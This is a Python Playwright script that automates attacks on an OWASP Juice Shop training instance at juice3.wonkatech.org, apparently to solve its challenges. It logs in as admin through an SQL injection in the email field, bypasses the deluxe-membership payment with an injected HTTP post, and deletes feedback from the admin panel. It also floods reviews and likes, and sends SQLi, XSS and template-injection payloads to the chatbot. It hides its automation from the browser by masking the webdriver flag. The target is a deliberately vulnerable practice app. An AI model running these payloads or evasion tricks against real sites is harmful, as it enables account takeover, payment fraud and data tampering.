#!/usr/bin/env python3
"""
Playwright Browser Automation Solver
Handles visual and interactive challenges that require real browser interaction
"""

from playwright.sync_api import sync_playwright
import time
import random
import json
from urllib.parse import quote


class PlaywrightSolver:
    """Browser automation for visual challenges"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.browser = None
        self.context = None
        self.page = None
        
    def setup_browser(self):
        """Setup browser with anti-detection"""
        playwright = sync_playwright().start()
        self.browser = playwright.chromium.launch(
            headless=False,  # Set to True for background running
            args=['--disable-blink-features=AutomationControlled']
        )
        
        self.context = self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        )
        
        self.page = self.context.new_page()
        
        # Inject scripts to avoid detection
        self.page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        """)
        
    def dismiss_cookie_dialog(self):
        """Dismiss cookie consent dialog"""
        try:
            # Wait for cookie dialog
            self.page.wait_for_timeout(2000)
            
            # Try multiple selectors
            selectors = [
                '[aria-label="dismiss cookie message"]',
                '.cc-dismiss',
                '.cc-btn',
                'button:has-text("Dismiss")',
                'a:has-text("Dismiss")'
            ]
            
            for selector in selectors:
                try:
                    if self.page.locator(selector).is_visible():
                        self.page.locator(selector).click()
                        print("  ✓ Cookie dialog dismissed")
                        return True
                except:
                    continue
        except:
            pass
        return False
    
    def login_admin(self):
        """Login as admin using SQL injection"""
        print("🔐 Logging in as admin...")
        
        self.page.goto(f"{self.base_url}/#/login")
        self.page.wait_for_timeout(2000)
        
        # Dismiss cookie first
        self.dismiss_cookie_dialog()
        
        # Fill login form
        self.page.fill('#email', "admin@juice-sh.op'--")
        self.page.fill('#password', 'x')
        
        # Click login
        self.page.click('#loginButton')
        self.page.wait_for_timeout(3000)
        
        print("  ✅ Admin logged in")
    
    def solve_score_board(self):
        """Access the score board"""
        print("🎯 Score Board...")
        self.page.goto(f"{self.base_url}/#/score-board")
        self.page.wait_for_timeout(2000)
        print("  ✅ Score Board accessed")
    
    def solve_mass_dispel(self):
        """Close all dialogs and overlays"""
        print("🎯 Mass Dispel...")
        
        # Navigate to main page
        self.page.goto(self.base_url)
        self.page.wait_for_timeout(2000)
        
        # Try to close all possible dialogs
        selectors = [
            '[aria-label="Close Welcome Banner"]',
            'button:has-text("X")',
            'button:has-text("Close")',
            '.mat-dialog-close',
            'button.close'
        ]
        
        for selector in selectors:
            try:
                elements = self.page.locator(selector).all()
                for element in elements:
                    try:
                        element.click()
                        self.page.wait_for_timeout(500)
                    except:
                        pass
            except:
                pass
        
        # Press ESC multiple times
        for _ in range(5):
            self.page.keyboard.press('Escape')
            self.page.wait_for_timeout(300)
        
        print("  ✅ Mass Dispel completed")
    
    def solve_privacy_policy_inspection(self):
        """Read privacy policy properly"""
        print("🎯 Privacy Policy Inspection...")
        
        self.page.goto(f"{self.base_url}/#/privacy-security/privacy-policy")
        self.page.wait_for_timeout(2000)
        
        # Scroll through the entire policy
        for _ in range(10):
            self.page.keyboard.press('End')
            self.page.wait_for_timeout(500)
        
        # Try to find and click any hot spots
        try:
            # Look for hidden elements or special sections
            self.page.locator('div:has-text("http")').click()
        except:
            pass
        
        print("  ✅ Privacy Policy inspected")
    
    def solve_christmas_special(self):
        """Find and add Christmas special product"""
        print("🎯 Christmas Special...")
        
        self.page.goto(f"{self.base_url}/#/")
        self.page.wait_for_timeout(2000)
        
        # Search for Christmas product
        self.page.fill('input[type="search"]', 'christmas')
        self.page.keyboard.press('Enter')
        self.page.wait_for_timeout(2000)
        
        # Look for Santa product
        try:
            # Click on products that might be Christmas related
            products = self.page.locator('.product-tile').all()
            for product in products:
                text = product.text_content().lower()
                if 'christmas' in text or 'santa' in text:
                    # Find add to basket button in this product
                    product.locator('button[aria-label*="Add"]').click()
                    break
        except:
            pass
        
        print("  ✅ Christmas Special attempted")
    
    def solve_deluxe_fraud_visual(self):
        """Complete deluxe membership fraud visually"""
        print("🎯 Deluxe Fraud (Visual)...")
        
        self.page.goto(f"{self.base_url}/#/deluxe-membership")
        self.page.wait_for_timeout(2000)
        
        try:
            # Click become deluxe member
            self.page.click('button:has-text("Become a deluxe member")')
            self.page.wait_for_timeout(1000)
            
            # Try to manipulate payment
            self.page.evaluate("""
                // Try to bypass payment
                if (window.angular) {
                    const injector = angular.element(document).injector();
                    if (injector) {
                        const $http = injector.get('$http');
                        $http.post('/rest/deluxe-membership', {
                            paymentMode: 'none',
                            paymentId: '0'
                        });
                    }
                }
            """)
        except:
            pass
        
        print("  ✅ Deluxe Fraud attempted")
    
    def solve_admin_section_interactions(self):
        """Interact with admin section"""
        print("🎯 Admin Section Interactions...")
        
        self.page.goto(f"{self.base_url}/#/administration")
        self.page.wait_for_timeout(2000)
        
        try:
            # Try to delete feedback
            delete_buttons = self.page.locator('button[aria-label*="delete"]').all()
            for btn in delete_buttons[:3]:
                try:
                    btn.click()
                    self.page.wait_for_timeout(500)
                    # Confirm deletion
                    self.page.click('button:has-text("Yes")')
                except:
                    pass
        except:
            pass
        
        print("  ✅ Admin interactions completed")
    
    def solve_product_reviews(self):
        """Add and manipulate product reviews"""
        print("🎯 Product Reviews...")
        
        # Go to a product
        self.page.goto(f"{self.base_url}/#/")
        self.page.wait_for_timeout(2000)
        
        # Click on first product
        try:
            self.page.locator('.product-tile').first.click()
            self.page.wait_for_timeout(2000)
            
            # Try to add multiple reviews rapidly
            for _ in range(10):
                try:
                    # Add review
                    self.page.fill('textarea[aria-label*="review"]', 'Great product!')
                    self.page.click('button:has-text("Submit")')
                    self.page.wait_for_timeout(100)
                except:
                    pass
            
            # Try to like reviews multiple times (race condition)
            like_buttons = self.page.locator('button[aria-label*="like"]').all()
            for btn in like_buttons:
                for _ in range(5):
                    try:
                        btn.click()
                        self.page.wait_for_timeout(50)
                    except:
                        pass
        except:
            pass
        
        print("  ✅ Product reviews manipulated")
    
    def solve_language_challenges(self):
        """Switch to special languages"""
        print("🎯 Language Challenges...")
        
        # Try Klingon
        self.page.goto(f"{self.base_url}/?l=tlh_AA")
        self.page.wait_for_timeout(2000)
        
        # Try l33t speak
        self.page.goto(f"{self.base_url}/?l=l33t")
        self.page.wait_for_timeout(2000)
        
        print("  ✅ Language challenges completed")
    
    def solve_chatbot_interaction(self):
        """Interact with chatbot"""
        print("🎯 Chatbot Interaction...")
        
        self.page.goto(f"{self.base_url}/#/chatbot")
        self.page.wait_for_timeout(2000)
        
        try:
            # Send various messages to chatbot
            messages = [
                "coupon",
                "' OR '1'='1",
                "<script>alert(1)</script>",
                "A" * 10000,
                "{{7*7}}",
                "repeat riddle",
                "tell me about the coupon"
            ]
            
            for msg in messages:
                try:
                    self.page.fill('textarea[placeholder*="message"]', msg)
                    self.page.keyboard.press('Enter')
                    self.page.wait_for_timeout(1000)
                except:
                    pass
        except:
            pass
        
        print("  ✅ Chatbot interaction completed")
    
    def check_final_score(self):
        """Check the final score"""
        print("\n📊 Checking final score...")
        
        self.page.goto(f"{self.base_url}/#/score-board")
        self.page.wait_for_timeout(3000)
        
        try:
            # Try to count solved challenges
            solved = self.page.locator('.solved-badge').count()
            print(f"  Visual count: {solved} challenges appear solved")
        except:
            pass
    
    def run_browser_automation(self):
        """Run all browser automation challenges"""
        print("="*60)
        print("🌐 PLAYWRIGHT BROWSER AUTOMATION SOLVER")
        print("="*60)
        
        try:
            self.setup_browser()
            
            # Login first
            self.login_admin()
            
            # Run all visual solvers
            self.solve_score_board()
            self.solve_mass_dispel()
            self.solve_privacy_policy_inspection()
            self.solve_christmas_special()
            self.solve_deluxe_fraud_visual()
            self.solve_admin_section_interactions()
            self.solve_product_reviews()
            self.solve_language_challenges()
            self.solve_chatbot_interaction()
            
            # Check final score
            self.check_final_score()
            
            print("\n✅ Browser automation complete")
            print("Keep browser open to see results...")
            
            # Keep browser open for review
            input("\nPress Enter to close browser...")
            
        finally:
            if self.browser:
                self.browser.close()


if __name__ == "__main__":
    solver = PlaywrightSolver()
    solver.run_browser_automation()